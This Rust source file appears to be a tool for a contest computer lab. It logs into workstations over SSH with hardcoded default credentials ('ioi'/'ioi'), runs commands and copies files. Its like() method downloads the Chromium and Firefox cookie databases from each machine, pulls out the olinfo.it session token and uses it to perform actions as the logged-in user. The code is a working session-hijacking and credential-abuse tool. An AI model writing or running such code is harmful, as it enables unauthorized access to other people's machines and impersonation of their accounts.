use cookie_loader::*;
use error::RemoteError;
use liker::like;
use ssh2::Session;
use std::fs::{read, write};
use std::io::prelude::*;
use std::net::TcpStream;
use std::path::Path;
use tempfile;

pub struct OlinfoClient {
    row: u8,
    column: u8,
    session: Session,
}

impl OlinfoClient {
    pub fn new(row: u8, column: u8) -> Result<OlinfoClient, RemoteError> {
        let username: &str = "ioi";
        let password: &str = "ioi";
        let addr: String = format!("[fdcd::c:{}:{}]:22", row, column);
        let tcp = TcpStream::connect(addr)?;
        let mut sess = Session::new().unwrap();
        sess.set_tcp_stream(tcp);
        sess.handshake()?;
        sess.userauth_password(username, password)?;
        Ok(OlinfoClient {
            row: row,
            column: column,
            session: sess,
        })
    }

    pub fn run(&self, command: String) -> Result<(String, String), RemoteError> {
        let mut channel = self.session.channel_session()?;
        channel.exec(&command)?;
        let mut stdout = String::new();
        let mut stderr = String::new();
        channel.read_to_string(&mut stdout)?;
        channel.stderr().read_to_string(&mut stderr)?;
        channel.wait_close()?;
        Ok((stdout, stderr))
    }

    pub fn send(&self, filename: String) -> Result<(), RemoteError> {
        let buffer = read(&filename)?;
        let path = Path::new(Path::new(&filename).file_name().unwrap());
        let mut remote_file = self
            .session
            .scp_send(path, 0o644, buffer.len() as u64, None)?;
        remote_file.write_all(&buffer)?;
        Ok(())
    }

    pub fn recv(&self, filename: String) -> Result<(), RemoteError> {
        let path = Path::new(&filename);
        let (mut remote_file, _) = self.session.scp_recv(path)?;
        let mut buffer = Vec::new();
        remote_file.read_to_end(&mut buffer)?;
        let local_file = format!(
            "{}_{}{}.{}",
            path.file_stem().unwrap().to_str().unwrap(),
            (64 + self.row) as char,
            self.column,
            match path.extension() {
                Some(ext) => ext.to_str().unwrap(),
                None => "",
            }
        );
        write(&local_file, buffer)?;
        Ok(())
    }

    pub fn like(&self, user: String) -> Result<(String, String), RemoteError> {
        {
            let mut tmpfile = tempfile::Builder::new().suffix(".sqlite").tempfile()?;
            let mut buffer = Vec::new();
            let chromium_path = Path::new(".config/chromium/Default/Cookies");
            if let Ok((mut remote_file, _)) = self.session.scp_recv(chromium_path) {
                remote_file.read_to_end(&mut buffer)?;
                tmpfile.write_all(&buffer)?;
                if let Some(token) = get_chromium_cookie(tmpfile.path(), ".olinfo.it", "token") {
                    return like(user, token.value().to_string());
                }
            }
        }
        {
            let mut tmpfile = tempfile::Builder::new().suffix(".sqlite").tempfile()?;
            let mut buffer = Vec::new();
            let firefox_match = self
                .run(format!("ls .mozilla/firefox/*/cookies.sqlite | head -1"))?
                .0;
            let firefox_path = Path::new(firefox_match.trim());
            if let Ok((mut remote_file, _)) = self.session.scp_recv(&firefox_path) {
                remote_file.read_to_end(&mut buffer)?;
                tmpfile.write_all(&buffer)?;
                if let Some(token) = get_firefox_cookie(tmpfile.path(), ".olinfo.it", "token") {
                    return like(user, token.value().to_string());
                }
            }
        }
        Err(RemoteError::new("cookie not found".to_string()))
    }
}
